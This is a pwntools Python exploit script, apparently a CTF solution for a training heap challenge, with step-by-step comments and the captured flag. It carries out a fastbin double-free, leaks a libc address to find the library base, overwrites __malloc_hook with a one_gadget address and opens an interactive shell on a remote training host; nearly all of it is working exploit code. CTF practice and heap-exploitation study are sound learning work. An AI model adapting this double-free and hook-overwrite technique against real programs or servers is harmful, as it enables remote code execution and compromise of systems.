from pwn import *

#flag{fastbin_ATTAAAAAAACK!!!!!!!}

#I need to alloc something with size > 0, then
# >ls >cd home >cd challenge 
#here is the flag

LEAK_OFFSET = 0x3c4b78
MALLOC_HOOK_OFFSET = 0x3c4b10
DELTA_HOOK = 0x23
MAGIC = 0xf1247

#defining the primitive for the four functions of the executable

def alloc(r, size):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("Size: ")
    r.sendline(str(size))

def write(r, index, data):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("Index: ")
    r.sendline(str(index))
    r.recvuntil("Content: ")
    r.send(data)

def read(r, index):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("Index: ")
    r.sendline(str(index))
    #now we want the output of the read (the printed string). "Options:\n" should be good enough as a stopper
    return r.recvuntil("\nOptions:").split(b"\nOptions:")[0]

def free(r, index):
    r.recvuntil("> ")
    r.sendline("4")
    r.recvuntil("Index: ")
    r.sendline(str(index))


 
#r = process("./fastbin_attack")

r = remote("bin.training.jinblack.it", 10101)



#implementing classic fastbin attack: 2 allocations + 3 frees
alloc(r, 0x60) #index 0
alloc(r, 0x60) #index 1
free(r, 0)
free(r, 1)
free(r, 0)


#I want to allocate a small bin and then to free it, but there is a problem: if I alloc a 0xA0 dimension chunk, when I free it, 
#it gets consolidated with the top chunk!
#so I have to allocate another chunk in between, to avoid consolidation.
#N.B. chunk A needs to be big enough in order not to be a fast bin, since fast bin chunks don't have libc addresses inside
alloc(r, 0xA0) #index 2
alloc(r, 0x20) #index 3
free(r, 2)
#now if I print the first chunk I have an address of the libc: leak!
#we don't care which address of the libc we are leaking, since we will retrieve the base of it thanks to the offset
leak = read(r, 2)
leak = u64(leak.ljust(8, b"\x00"))
#we retrieve the value 0x3c4b78 as offset, since with vmmap we saw the beginning address of the libc, so we computed the difference with the leak:
#in python hex(0x7ffff7bcdb78 - 0x7ffff7809000), that is the difference between the leak and the starting address of the libc
#now I need to do it at runtime since I know the offset
libc_base = leak - LEAK_OFFSET
print("Libc base: " + hex(libc_base))

#now we want to allocate and modify the chunk
alloc(r, 0x60) #index 4
alloc(r, 0x60) #index 5
#overwriting the malloc_hook
write(r, 4, p64(libc_base + MALLOC_HOOK_OFFSET - DELTA_HOOK))
alloc(r, 0x60) #index 6

alloc(r, 0x60) #index 7
payload = b"A" * (DELTA_HOOK - 0X10)
payload += p64(libc_base + MAGIC)
write(r, 7, payload)

r.interactive()